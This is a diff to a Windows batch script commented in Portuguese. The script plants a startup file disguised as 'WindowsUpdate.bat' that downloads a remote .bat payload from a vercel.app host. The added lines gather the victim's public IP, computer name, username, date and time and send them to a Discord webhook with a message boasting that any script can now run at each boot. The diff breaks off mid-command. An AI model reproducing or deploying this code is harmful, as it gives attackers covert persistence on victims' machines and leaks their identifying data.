@@ -7,7 +7,17 @@ echo powershell -c "iwr 'https://lzx-one.vercel.app/LXZ.bat' -OutFile $env:TEMP\
 ) > "%startup%\WindowsUpdate.bat"
 
 
-set MESSAGE=Copiador executado com sucesso, voce tem direito de colocar qualquer script quando esse usuario iniciar o pc para ser executado
+:: Pega IP público
+for /f %%A in ('curl -s https://api.ipify.org') do set IP=%%A
+:: Infos do sistema
+set PC=%COMPUTERNAME%
+set USER=%USERNAME%
+
+:: Data e hora
+set DATA=%DATE%
+set HORA=%TIME:~0,5%
+
+set MESSAGE=Copiador executado com sucesso. Voce tem direito de colocar qualquer script quando esse usuario  iniciar o pc para ser executado PC %PC% - Usuario %USER% - IP %IP% - Data %DATA% - Hora %HORA%
 
 :: Envia pro Discord
 curl -s ^
